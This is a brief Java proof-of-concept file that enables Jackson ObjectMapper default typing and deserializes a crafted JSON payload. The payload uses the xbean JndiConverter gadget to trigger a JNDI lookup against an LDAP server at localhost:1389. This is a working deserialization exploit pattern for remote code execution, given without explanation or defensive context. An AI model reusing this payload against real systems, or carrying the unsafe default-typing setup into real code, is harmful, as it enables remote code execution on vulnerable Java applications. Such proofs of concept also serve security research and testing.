import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
    public static void main(String args[]) {
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

        try {
            mapper.readValue(json, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
